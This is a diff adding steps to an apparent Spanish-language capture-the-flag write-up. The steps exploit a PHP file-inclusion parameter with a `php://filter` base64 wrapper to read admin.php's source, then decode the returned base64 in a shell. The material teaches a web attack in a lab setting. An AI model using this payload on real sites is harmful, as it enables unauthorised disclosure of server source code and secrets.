@@ -133,7 +133,28 @@ También podemos mirar el fichero llamado `index.php` en este archivo lo primero
 
 Vemos que para apuntar al recurso de el *Admin Panel*, utiliza el recurso `?page=admin`, además vemos que esta sanitizado la entrada de este parámetro evitando entradas como `/bin, /usr, /home, /var, /etc`, además a cualquier parámetro que introduzcas se le hace un `include` de la extensión `.php`.
 
-Lo que podemos hacer es a la hora de hacer la consulta hacia `?page=admin`
+Lo que podemos hacer es a la hora de hacer la consulta hacia `?page=admin` nos esta concatenando al final de la consulta el `.php`, accediendo a la ruta con un botón que te lleva al *Admin Panel*.
+Pero en vez de hacer la consulta de esa forma lo que podemos hacer es un wraper que lo codifique en *base64*, y así no interprete el código php y te lo mostraría en *base64*
+```php
+?page=php://filter/convert.base64-encode/resource=admin
+```
+
+Por lo cual ahora por pantalla no muestra el script en *base64*, del archivo `admin.php` ya que concatena después de `admin` la extensión `.php`
+```base64
+PD9waHAKI0VtcHR5IGZvciBub3cuCj8+
+```
+
+Lo decodeamos el *base64*
+```shell
+echo -n 'PD9waHAKI0VtcHR5IGZvciBub3cuCj8+' | base64 -d; echo
+```
+
+Dándonos como resultado el código `php` del `admin.php`
+```php
+<?php
+#Empty for now.
+?>
+```
 
 
 
